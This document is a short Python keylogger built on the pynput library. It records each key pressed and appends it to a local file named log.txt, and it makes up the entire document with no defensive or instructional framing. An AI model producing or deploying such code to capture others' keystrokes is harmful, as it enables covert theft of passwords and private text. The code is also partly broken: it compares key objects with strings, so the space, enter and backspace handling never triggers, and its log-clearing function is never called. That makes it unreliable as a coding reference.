from pynput.keyboard import Listener, Key

def writeto(key):
    keydata = str(key).replace("'", "")

    if key == 'Key.space':
        keydata = ' '
    elif key == 'Key.enter':
        keydata = '\n'
    elif key == 'Key.backspace':
        keydata = ''
    elif key in {Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.caps_lock, Key.tab, Key.esc}:
        keydata = ''

    with open("log.txt", 'a') as f:
        f.write(keydata)

#to clear the log file after code termination
def clear_log():
    with open("log.txt", 'w') as f:
        f.truncate(0)

with Listener(on_press=writeto) as l:
    l.join()